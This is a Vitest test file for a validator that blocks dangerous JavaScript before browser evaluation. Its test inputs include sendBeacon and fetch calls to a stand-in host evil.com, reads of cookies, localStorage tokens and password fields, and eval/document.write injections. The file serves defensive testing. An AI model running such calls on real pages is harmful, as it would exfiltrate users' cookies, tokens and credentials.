import { describe, expect, it } from "vitest";
import {
  createValidationError,
  validateBrowserEvalFunction,
  validateOrThrow,
  type ValidationResult,
} from "./browser-eval-validator.js";

describe("validateBrowserEvalFunction", () => {
  describe("safe functions", () => {
    it("allows simple property access", () => {
      const result = validateBrowserEvalFunction("() => document.title");
      expect(result.safe).toBe(true);
    });

    it("allows element text content", () => {
      const result = validateBrowserEvalFunction("(el) => el.textContent");
      expect(result.safe).toBe(true);
    });

    it("allows element value access", () => {
      const result = validateBrowserEvalFunction("(el) => el.value");
      expect(result.safe).toBe(true);
    });

    it("allows getAttribute", () => {
      const result = validateBrowserEvalFunction('(el) => el.getAttribute("href")');
      expect(result.safe).toBe(true);
    });

    it("allows classList operations", () => {
      const result = validateBrowserEvalFunction("(el) => el.classList.contains('active')");
      expect(result.safe).toBe(true);
    });

    it("allows empty function body", () => {
      const result = validateBrowserEvalFunction("");
      expect(result.safe).toBe(true);
    });

    it("allows whitespace-only function body", () => {
      const result = validateBrowserEvalFunction("   \n\t  ");
      expect(result.safe).toBe(true);
    });

    it("allows simple arithmetic", () => {
      const result = validateBrowserEvalFunction("() => 1 + 1");
      expect(result.safe).toBe(true);
    });

    it("allows querySelector", () => {
      const result = validateBrowserEvalFunction('() => document.querySelector(".test")');
      expect(result.safe).toBe(true);
    });

    it("allows JSON.stringify", () => {
      const result = validateBrowserEvalFunction("(data) => JSON.stringify(data)");
      expect(result.safe).toBe(true);
    });
  });

  describe("network operations", () => {
    it("blocks fetch()", () => {
      const result = validateBrowserEvalFunction('() => fetch("https://evil.com")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("fetch()");
    });

    it("blocks XMLHttpRequest", () => {
      const result = validateBrowserEvalFunction("() => new XMLHttpRequest()");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("XMLHttpRequest");
    });

    it("blocks WebSocket", () => {
      const result = validateBrowserEvalFunction('() => new WebSocket("ws://evil.com")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("WebSocket");
    });

    it("blocks navigator.sendBeacon", () => {
      const result = validateBrowserEvalFunction(
        '() => navigator.sendBeacon("https://evil.com", data)',
      );
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("sendBeacon");
    });
  });

  describe("storage access", () => {
    it("blocks localStorage", () => {
      const result = validateBrowserEvalFunction("() => localStorage.getItem('token')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("localStorage");
    });

    it("blocks sessionStorage", () => {
      const result = validateBrowserEvalFunction("() => sessionStorage.getItem('session')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("sessionStorage");
    });

    it("blocks document.cookie", () => {
      const result = validateBrowserEvalFunction("() => document.cookie");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("cookie");
    });

    it("blocks IndexedDB", () => {
      const result = validateBrowserEvalFunction("() => indexedDB.open('db')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("IndexedDB");
    });
  });

  describe("code execution", () => {
    it("blocks eval()", () => {
      const result = validateBrowserEvalFunction('() => eval("alert(1)")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("eval()");
    });

    it("blocks Function constructor", () => {
      const result = validateBrowserEvalFunction('() => new Function("alert(1)")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("Function()");
    });

    it("blocks dynamic import", () => {
      const result = validateBrowserEvalFunction('() => import("./evil.js")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("import()");
    });

    it("blocks require()", () => {
      const result = validateBrowserEvalFunction('() => require("evil")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("require()");
    });
  });

  describe("dangerous DOM operations", () => {
    it("blocks document.write", () => {
      const result = validateBrowserEvalFunction('() => document.write("<script>evil</script>")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("document.write");
    });
  });

  describe("navigation", () => {
    it("blocks location.href assignment", () => {
      const result = validateBrowserEvalFunction('() => location.href = "https://evil.com"');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("location.href");
    });

    it("blocks location.replace", () => {
      const result = validateBrowserEvalFunction('() => location.replace("https://evil.com")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("location.replace");
    });

    it("blocks location.assign", () => {
      const result = validateBrowserEvalFunction('() => location.assign("https://evil.com")');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("location.assign");
    });
  });

  describe("service workers", () => {
    it("blocks ServiceWorker", () => {
      const result = validateBrowserEvalFunction(
        '() => navigator.serviceWorker.register("sw.js")',
      );
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("ServiceWorker");
    });
  });

  describe("credential access", () => {
    it("blocks credentials keyword", () => {
      const result = validateBrowserEvalFunction('() => navigator.credentials.get()');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("credentials");
    });

    it("blocks password keyword", () => {
      const result = validateBrowserEvalFunction('() => document.getElementById("password").value');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("password");
    });
  });

  describe("syntax validation", () => {
    it("blocks invalid syntax", () => {
      const result = validateBrowserEvalFunction("() => {{{invalid syntax}}}");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("Invalid function syntax");
    });

    it("blocks unterminated strings", () => {
      const result = validateBrowserEvalFunction('() => "unterminated');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("Invalid function syntax");
    });

    it("skips syntax check when skipSyntaxCheck is true", () => {
      const result = validateBrowserEvalFunction("() => {{{invalid}}}", {
        skipSyntaxCheck: true,
      });
      expect(result.safe).toBe(true);
    });
  });

  describe("options", () => {
    it("allows dangerous patterns when allowDangerous is true", () => {
      const result = validateBrowserEvalFunction('() => fetch("https://api.com")', {
        allowDangerous: true,
      });
      expect(result.safe).toBe(true);
    });

    it("blocks custom patterns", () => {
      const result = validateBrowserEvalFunction("() => myDangerousFunction()", {
        customBlockedPatterns: [
          { pattern: /myDangerousFunction/i, description: "custom dangerous function" },
        ],
      });
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("custom dangerous function");
    });

    it("combines default and custom patterns", () => {
      const result = validateBrowserEvalFunction('() => fetch("url") && myFunc()', {
        customBlockedPatterns: [{ pattern: /myFunc/i, description: "my function" }],
      });
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("fetch()"); // Blocked by default pattern
    });
  });

  describe("case insensitivity", () => {
    it("blocks FETCH in uppercase", () => {
      const result = validateBrowserEvalFunction('() => FETCH("url")');
      expect(result.safe).toBe(false);
    });

    it("blocks FeTcH in mixed case", () => {
      const result = validateBrowserEvalFunction('() => FeTcH("url")');
      expect(result.safe).toBe(false);
    });
  });
});

describe("createValidationError", () => {
  it("creates error with reason", () => {
    const result: ValidationResult = {
      safe: false,
      reason: "Dangerous pattern detected: fetch()",
      blockedPattern: "fetch",
    };
    const error = createValidationError(result);
    expect(error.message).toContain("fetch()");
    expect(error.name).toBe("BrowserEvalSecurityError");
  });

  it("creates error without reason", () => {
    const result: ValidationResult = { safe: false };
    const error = createValidationError(result);
    expect(error.message).toContain("security validation failed");
    expect(error.name).toBe("BrowserEvalSecurityError");
  });
});

describe("validateOrThrow", () => {
  it("does not throw for safe functions", () => {
    expect(() => validateOrThrow("() => document.title")).not.toThrow();
  });

  it("throws for unsafe functions", () => {
    expect(() => validateOrThrow('() => fetch("url")')).toThrow("fetch()");
  });

  it("throws BrowserEvalSecurityError", () => {
    try {
      validateOrThrow('() => fetch("url")');
      expect.fail("Should have thrown");
    } catch (err) {
      expect(err).toBeInstanceOf(Error);
      expect((err as Error).name).toBe("BrowserEvalSecurityError");
    }
  });

  it("respects allowDangerous option", () => {
    expect(() => validateOrThrow('() => fetch("url")', { allowDangerous: true })).not.toThrow();
  });
});
